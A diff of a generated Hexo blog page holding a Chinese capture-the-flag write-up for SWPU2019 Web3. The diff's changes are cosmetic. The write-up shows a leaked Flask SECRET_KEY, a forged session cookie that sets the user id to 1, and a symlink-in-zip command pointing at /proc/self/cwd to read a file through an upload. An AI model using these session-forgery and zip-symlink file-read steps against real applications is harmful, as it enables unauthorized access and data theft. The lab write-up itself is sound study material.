@@ -54,7 +54,7 @@ key在访问不存在的目录时，会出现在请求头当中
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -529,12 +529,12 @@ key在访问不存在的目录时，会出现在请求头当中
                     
                     <div class="article-tag">
                         
-                            <a href="./tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="./tags/Web/">
                                 <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="./tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                             <a href="./tags/Flask/">
@@ -602,26 +602,26 @@ key在访问不存在的目录时，会出现在请求头当中
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[proc|session构造]</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905113040550.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905113040550.png"></p>
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>直接登录</p>
 <p>进去点upload提示</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905113153000.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905113153000.png"></p>
 <p>怀疑cookies构造</p>
 <p>解个session</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134558982.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134558982.png"></p>
 <p>要想构造session需要知道key</p>
 <blockquote>
 <p><code>key</code>在访问不存在的目录时，会出现在请求头当中</p>
 </blockquote>
 <p>这个着实想不到</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134204719.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134204719.png"></p>
 <p>解个码</p>
 <pre class="line-numbers language-none"><code class="language-none">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后改下id为1，加密</p>
 <pre class="line-numbers language-none"><code class="language-none">.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTRZrw.bnK5U9yUqQ7hlU1hGddmyAzlE4g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134657578.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905134657578.png"></p>
 <p>注释有源码</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
 <span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -702,13 +702,13 @@ key在访问不存在的目录时，会出现在请求头当中
 
 <p>大概就是上传zip压缩包，然后解压显示图片</p>
 <p>给出了flag路径</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905135552520.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905135552520.png"></p>
 <p>这里利用软链接和<code>/proc/self/cwd</code></p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ln</span> -s /proc/self/cwd/flag/flag.jpg <span class="token builtin class-name">test</span>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> -s /proc/self/cwd/flag/flag.jpg <span class="token builtin class-name">test</span>
 <span class="token function">zip</span> -ry test.zip <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>上传，结束</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905140736523.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web3/image-20210905140736523.png"></p>
 
                 
             </div>
@@ -773,12 +773,12 @@ key在访问不存在的目录时，会出现在请求头当中
                     
                         <div class="article-tag">
                             
-                                <a href="./tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
                                 <a href="./tags/Web/">
                                     <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="./tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                                 <a href="./tags/Flask/">
@@ -1132,12 +1132,12 @@ key在访问不存在的目录时，会出现在请求头当中
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
@@ -1185,12 +1185,12 @@ key在访问不存在的目录时，会出现在请求头当中
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
